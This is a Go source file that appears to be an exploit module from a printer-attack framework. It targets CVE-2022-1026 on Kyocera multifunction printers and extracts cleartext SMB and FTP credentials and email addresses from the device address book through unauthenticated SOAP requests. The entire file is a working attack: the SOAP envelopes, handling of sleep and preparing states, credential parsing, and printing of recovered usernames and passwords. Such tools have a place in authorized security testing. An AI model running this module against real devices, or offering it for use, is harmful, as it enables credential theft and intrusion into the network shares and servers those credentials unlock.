package safe

import (
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"papercut/internal/modules"
	"papercut/internal/output"
)

func init() { register(func() modules.ExploitModule { return NewKyoceraAddrBook() }) }

// KyoceraAddrBook exploits CVE-2022-1026 to extract cleartext credentials
// from the Kyocera address book via an unauthenticated SOAP request on port 9091.
//
// The SOAP service at /ws/km-wsdl/setting/address_book allows anyone to enumerate
// the personal address book and extract SMB, FTP, and email credentials in cleartext.
//
// Two-step process:
// 1. create_personal_address_enumeration — get an enumeration handle
// 2. get_personal_address_list — retrieve address book entries using the handle
//
// Handles DEEP_SLEEP_NOW_ERROR (retry) and PREPARING_NOW (poll) device states.
//
// Category: SAFE — read-only, no settings modified, no authentication needed.
type KyoceraAddrBook struct {
	modules.BaseModule
}

// NewKyoceraAddrBook creates a new instance of the Kyocera address book extractor.
func NewKyoceraAddrBook() *KyoceraAddrBook {
	m := &KyoceraAddrBook{
		BaseModule: modules.BaseModule{
			Mod: modules.Module{
				Name:         "kyocera/soap/addr_book_extract",
				Description:  "Kyocera Address Book Credential Extractor — unauthenticated SOAP extraction (CVE-2022-1026)",
				Manufacturer: "Kyocera",
				Category:     "SAFE",
				Authors:      []string{"Waffl3ss", "ac3lives", "h4po0n"},
				Tags:         []string{"kyocera", "soap", "address book", "credentials", "cve-2022-1026", "unauthenticated", "mfp"},
				Models:       []string{"ECOSYS M2640idw", "TASKalfa 406ci", "TASKalfa 356ci", "ECOSYS M6235cidn"},
			},
			Opts: []*modules.Option{
				{Name: "RHOST", Default: "", Required: true, Description: "Target IP address"},
				{Name: "RPORT", Default: "9091", Required: false, Description: "Target SOAP port"},
				{Name: "SSL", Default: "true", Required: false, Description: "Use HTTPS (default for port 9091)"},
				{Name: "VERBOSE", Default: "false", Required: false, Description: "Verbose output"},
				{Name: "TIMEOUT", Default: "20", Required: false, Description: "HTTP request timeout in seconds"},
				{Name: "PROXY", Default: "", Required: false, Description: "Proxy (socks5://host:port or http://host:port)"},
			},
		},
	}
	m.InitDefaults()
	return m
}

func (k *KyoceraAddrBook) newHTTPClient() *http.Client {
	return &http.Client{
		Timeout:   time.Duration(k.IntVal("TIMEOUT", 20)) * time.Second,
		Transport: modules.NewHTTPTransport(k.Val("PROXY")),
	}
}

func (k *KyoceraAddrBook) baseURL() string {
	scheme := "https"
	if !k.BoolVal("SSL") {
		scheme = "http"
	}
	return fmt.Sprintf("%s://%s:%s", scheme, k.Val("RHOST"), k.Val("RPORT"))
}

func (k *KyoceraAddrBook) soapURL() string {
	return k.baseURL() + "/ws/km-wsdl/setting/address_book"
}

// Check verifies the target has the Kyocera SOAP address book service accessible.
func (k *KyoceraAddrBook) Check() (*modules.CheckResult, error) {
	if err := k.Validate(); err != nil {
		return nil, err
	}

	rhost := k.Val("RHOST")
	portInt := k.IntVal("RPORT", 9091)
	verbose := k.BoolVal("VERBOSE")

	client := k.newHTTPClient()

	if verbose {
		output.Info("  Checking %s for Kyocera SOAP service...", k.soapURL())
	}

	// Try to create an enumeration — if it works, the service is exposed
	enumID, err := k.createEnumeration(client, verbose)
	if err != nil {
		return &modules.CheckResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("SOAP service not accessible: %v", err),
		}, nil
	}

	return &modules.CheckResult{
		Success: true, Target: rhost, Port: portInt,
		Details: fmt.Sprintf("Kyocera SOAP address book accessible (enumeration: %s)", enumID),
	}, nil
}

// Exploit extracts the address book and parses credentials.
func (k *KyoceraAddrBook) Exploit() (*modules.ExploitResult, error) {
	if err := k.Validate(); err != nil {
		return nil, err
	}

	rhost := k.Val("RHOST")
	portInt := k.IntVal("RPORT", 9091)
	verbose := k.BoolVal("VERBOSE")

	client := k.newHTTPClient()

	// Step 1: Create enumeration
	output.Info("Creating address book enumeration on %s...", k.soapURL())

	enumID, err := k.createEnumeration(client, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Enumeration failed: %v", err),
		}, nil
	}

	output.Success("Enumeration handle: %s", enumID)

	// Step 2: Wait for address book to populate, then retrieve
	output.Info("Waiting for address book to populate...")
	time.Sleep(3 * time.Second)

	output.Info("Retrieving address book...")

	entries, rawBody, err := k.getAddressList(client, enumID, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Address list retrieval failed: %v", err),
		}, nil
	}

	if len(entries) == 0 {
		// Count personal_address blocks to distinguish empty book from entries-without-creds
		addrBlocks := splitXMLBlocks(rawBody, "personal_address")
		if len(addrBlocks) == 0 {
			output.Warn("Address book is empty (0 entries)")
		} else {
			output.Warn("Address book has %d entries but none contain credentials", len(addrBlocks))
		}

		if verbose {
			output.Info("  Response size: %d bytes", len(rawBody))
		}

		return &modules.ExploitResult{
			Success: true, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Address book accessible but no credentials (%d entries)", len(addrBlocks)),
		}, nil
	}

	// Display results
	fmt.Println()
	for _, e := range entries {
		output.Success("--- %s Credential ---", e.protocol)
		if e.entryName != "" {
			output.Success("  Entry:    %s", e.entryName)
		}
		if e.server != "" {
			output.Success("  Server:   %s", e.server)
		}
		if e.port != "" {
			output.Success("  Port:     %s", e.port)
		}
		if e.path != "" {
			output.Success("  Path:     %s", e.path)
		}
		if e.username != "" {
			output.Success("  Username: %s", e.username)
		}
		if e.password != "" {
			output.Success("  Password: %s", e.password)
		}
		if e.address != "" {
			output.Success("  Address:  %s", e.address)
		}
		fmt.Println()
	}

	// Build data string for storage
	var dataLines []string
	for _, e := range entries {
		user := e.username
		if user == "" {
			user = e.address
		}
		line := fmt.Sprintf("[%s] User: %s Pass: %s", e.protocol, user, e.password)
		if e.server != "" {
			line += fmt.Sprintf(" Host: %s", e.server)
		}
		dataLines = append(dataLines, line)
	}

	return &modules.ExploitResult{
		Success: true, Target: rhost, Port: portInt,
		Details: fmt.Sprintf("Extracted %d credential(s) from address book", len(entries)),
		Data:    strings.Join(dataLines, "\n"),
	}, nil
}

// createEnumeration sends the SOAP request to create an address book enumeration.
// Retries on DEEP_SLEEP_NOW_ERROR.
func (k *KyoceraAddrBook) createEnumeration(client *http.Client, verbose bool) (string, error) {
	envelope := `<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:addressing="http://schemas.xmlsoap.org/ws/2004/08/addressing"
  xmlns:kmaddrbook="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">
  <SOAP-ENV:Header>
    <addressing:Action>http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</addressing:Action>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <kmaddrbook:create_personal_address_enumerationRequest>
      <kmaddrbook:number>25</kmaddrbook:number>
    </kmaddrbook:create_personal_address_enumerationRequest>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>`

	for attempt := 1; attempt <= 3; attempt++ {
		if verbose {
			output.Info("  POST %s (create enumeration, attempt %d)", k.soapURL(), attempt)
		}

		body, err := k.postSOAP(client, envelope)
		if err != nil {
			return "", fmt.Errorf("SOAP request failed: %w", err)
		}

		// Check for error states
		result := xmlSimpleValue(body, "result")
		upperResult := strings.ToUpper(result)

		if upperResult == "DEEP_SLEEP_NOW_ERROR" {
			if verbose {
				output.Warn("  Device in deep sleep, retrying in 5s...")
			}
			time.Sleep(5 * time.Second)
			continue
		}

		// Extract enumeration ID
		enumID := xmlSimpleValue(body, "enumeration")
		if enumID == "" {
			return "", fmt.Errorf("no enumeration ID in response (result: %s)", result)
		}

		if verbose {
			output.Success("  Enumeration ID: %s (result: %s)", enumID, result)
		}

		return enumID, nil
	}

	return "", fmt.Errorf("enumeration failed after 3 attempts (device may be in deep sleep)")
}

// getAddressList retrieves address book entries using the enumeration handle.
// Polls on PREPARING_NOW state up to 120 seconds.
func (k *KyoceraAddrBook) getAddressList(client *http.Client, enumID string, verbose bool) ([]kyoceraEntry, string, error) {
	envelope := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:addressing="http://schemas.xmlsoap.org/ws/2004/08/addressing"
  xmlns:kmaddrbook="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">
  <SOAP-ENV:Header>
    <addressing:Action>http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</addressing:Action>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <kmaddrbook:get_personal_address_listRequest>
      <kmaddrbook:enumeration>%s</kmaddrbook:enumeration>
    </kmaddrbook:get_personal_address_listRequest>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>`, enumID)

	start := time.Now()
	for {
		if verbose {
			output.Info("  POST %s (get address list)", k.soapURL())
		}

		body, err := k.postSOAP(client, envelope)
		if err != nil {
			return nil, "", fmt.Errorf("SOAP request failed: %w", err)
		}

		result := strings.ToUpper(xmlSimpleValue(body, "result"))

		if result == "PREPARING_NOW" {
			elapsed := int(time.Since(start).Seconds())
			if elapsed >= 120 {
				return nil, body, fmt.Errorf("device still preparing after %ds", elapsed)
			}
			if verbose {
				output.Info("  Device preparing (%d/120s), polling...", elapsed)
			}
			time.Sleep(5 * time.Second)
			continue
		}

		if result != "ALL_GET_COMPLETE" && result != "SUCCESS" && result != "" {
			return nil, body, fmt.Errorf("retrieval failed (result: %s)", result)
		}

		// Parse address book entries
		entries := parseKyoceraAddressBook(body)

		return entries, body, nil
	}
}

func (k *KyoceraAddrBook) postSOAP(client *http.Client, envelope string) (string, error) {
	req, err := http.NewRequest("POST", k.soapURL(), strings.NewReader(envelope))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "text/xml; charset=utf-8")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("read response: %w", err)
	}

	return string(body), nil
}

// kyoceraEntry holds a single parsed credential from the address book.
type kyoceraEntry struct {
	entryName string
	protocol  string // SMB, FTP, EMAIL
	server    string
	port      string
	path      string
	username  string
	password  string
	address   string // email address
}

// parseKyoceraAddressBook extracts credentials from the SOAP response body.
// Looks for smb_information, ftp_information, and email_information blocks
// within personal_address entries.
func parseKyoceraAddressBook(body string) []kyoceraEntry {
	var entries []kyoceraEntry

	// Split into personal_address blocks
	blocks := splitXMLBlocks(body, "personal_address")

	for _, block := range blocks {
		entryName := xmlSimpleValue(block, "name")

		// SMB credentials
		if strings.Contains(block, "smb_information") {
			user := xmlSimpleValue(block, "login_name")
			pass := xmlSimpleValue(block, "login_password")
			server := xmlSimpleValue(block, "server_name")

			if user != "" || pass != "" || server != "" {
				entries = append(entries, kyoceraEntry{
					entryName: entryName,
					protocol:  "SMB",
					server:    server,
					port:      xmlSimpleValue(block, "port_number"),
					path:      xmlSimpleValue(block, "file_path"),
					username:  user,
					password:  pass,
				})
			}
		}

		// FTP credentials
		if strings.Contains(block, "ftp_information") {
			// Extract FTP block specifically to avoid mixing with SMB fields
			ftpBlock := extractXMLBlock(block, "ftp_information")
			if ftpBlock != "" {
				user := xmlSimpleValue(ftpBlock, "login_name")
				pass := xmlSimpleValue(ftpBlock, "login_password")
				server := xmlSimpleValue(ftpBlock, "server_name")

				if user != "" || pass != "" || server != "" {
					entries = append(entries, kyoceraEntry{
						entryName: entryName,
						protocol:  "FTP",
						server:    server,
						port:      xmlSimpleValue(ftpBlock, "port_number"),
						username:  user,
						password:  pass,
					})
				}
			}
		}

		// Email
		if strings.Contains(block, "email_information") {
			addr := xmlSimpleValue(block, "address")
			if addr != "" {
				entries = append(entries, kyoceraEntry{
					entryName: entryName,
					protocol:  "EMAIL",
					address:   addr,
				})
			}
		}
	}

	return entries
}

// splitXMLBlocks splits XML body by a tag name, returning the content of each block.
// Handles namespaced tags (e.g., <ns:personal_address> or <personal_address>).
func splitXMLBlocks(body, tag string) []string {
	var blocks []string
	remaining := body
	for {
		// Find opening tag (with or without namespace prefix)
		startIdx := -1
		searchPatterns := []string{"<" + tag + ">", "<" + tag + " "}
		for _, pat := range searchPatterns {
			if idx := strings.Index(remaining, pat); idx >= 0 {
				if startIdx < 0 || idx < startIdx {
					startIdx = idx
				}
			}
		}
		// Also check namespaced: <ns:tag> or <ns:tag ...>
		for i := 0; i < len(remaining)-1; i++ {
			if remaining[i] == '<' && remaining[i+1] != '/' {
				// Find the end of the tag name
				end := strings.IndexAny(remaining[i+1:], "> ")
				if end < 0 {
					continue
				}
				tagName := remaining[i+1 : i+1+end]
				// Check if it ends with :tag
				if strings.HasSuffix(tagName, ":"+tag) {
					if startIdx < 0 || i < startIdx {
						startIdx = i
					}
					break
				}
			}
		}

		if startIdx < 0 {
			break
		}

		// Find closing tag
		closePatterns := []string{"</" + tag + ">"}
		// Also check namespaced close
		closeIdx := -1
		for _, cpat := range closePatterns {
			if idx := strings.Index(remaining[startIdx:], cpat); idx >= 0 {
				endPos := startIdx + idx + len(cpat)
				if closeIdx < 0 || endPos < closeIdx {
					closeIdx = endPos
				}
			}
		}
		// Check namespaced close tags
		searchFrom := startIdx
		for i := searchFrom; i < len(remaining)-2; i++ {
			if remaining[i] == '<' && remaining[i+1] == '/' {
				end := strings.Index(remaining[i+2:], ">")
				if end < 0 {
					continue
				}
				closeName := remaining[i+2 : i+2+end]
				if closeName == tag || strings.HasSuffix(closeName, ":"+tag) {
					endPos := i + 2 + end + 1
					if closeIdx < 0 || endPos < closeIdx {
						closeIdx = endPos
					}
					break
				}
			}
		}

		if closeIdx < 0 {
			break
		}

		blocks = append(blocks, remaining[startIdx:closeIdx])
		remaining = remaining[closeIdx:]
	}

	return blocks
}

// extractXMLBlock extracts the content of the first occurrence of a tag block.
func extractXMLBlock(body, tag string) string {
	blocks := splitXMLBlocks(body, tag)
	if len(blocks) > 0 {
		return blocks[0]
	}
	return ""
}

// xmlSimpleValue extracts the text content of a simple XML tag, handling namespaces.
// e.g. <login_name>foo</login_name> or <ns:login_name>foo</ns:login_name>
func xmlSimpleValue(body, tag string) string {
	// Try without namespace first
	open := "<" + tag + ">"
	close := "</" + tag + ">"
	if idx := strings.Index(body, open); idx >= 0 {
		start := idx + len(open)
		if end := strings.Index(body[start:], close); end >= 0 {
			return strings.TrimSpace(body[start : start+end])
		}
	}

	// Try with namespace prefix (e.g., <kmaddrbook:tag>)
	// Search for ":tag>" pattern
	suffix := ":" + tag + ">"
	idx := strings.Index(body, suffix)
	if idx < 0 {
		return ""
	}

	// Find the start of this opening tag
	openStart := strings.LastIndex(body[:idx], "<")
	if openStart < 0 || body[openStart+1] == '/' {
		return ""
	}

	start := idx + len(suffix)

	// Find closing tag with same namespace
	closeSuffix := ":"+tag+">"
	closeSearch := "</";
	_ = closeSearch
	for i := start; i < len(body)-2; i++ {
		if body[i] == '<' && body[i+1] == '/' {
			end := strings.Index(body[i+2:], closeSuffix)
			if end >= 0 {
				return strings.TrimSpace(body[start : i])
			}
		}
	}

	return ""
}
